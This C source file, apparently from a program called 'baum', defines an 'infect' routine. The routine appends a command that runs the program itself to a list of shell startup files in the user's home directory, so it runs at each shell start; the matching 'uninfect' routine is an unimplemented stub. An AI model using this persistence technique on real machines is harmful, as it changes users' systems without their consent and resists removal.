#include "infect.h"

#include <stdio.h>

#include "baumcommon.h"

int baum_infect(const char *rc_files[], char test_mode) {
	int helper_ret = 0;

	char my_filename[BUFSIZ];
	helper_ret = helper_get_own_name(my_filename, BUFSIZ);
	if (helper_ret != 0) {
		return 1;
	}

	helper_ret = helper_chdir_home();
	if (helper_ret != 0) {
		return 1;
	}

	char text[BUFSIZ];
	snprintf(text, BUFSIZ, "%s --print", my_filename);
	printf_v("Injecting this text: \n%s\n", text);

	for (size_t i = 0; rc_files[i] != NULL; i++) {
		printf_v("Writing to file %s", rc_files[i]);
		if (test_mode) continue;

		FILE *f = fopen(rc_files[i], "a");
		if (f) {
			helper_ret = fprintf(f, "\n%s\n", text);
			if (helper_ret > 0) {
				printf_v("Success");
			} else {
				printf_v("Failed");
			}
			fclose(f);
		} else {
			printf_v("  Cannot open file");
		}
	}
	return 0;
}

int baum_uninfect(const char *rc_files[], char test_mode) {
	printf_v("uninfect not implemented yet");
	return 1;
}

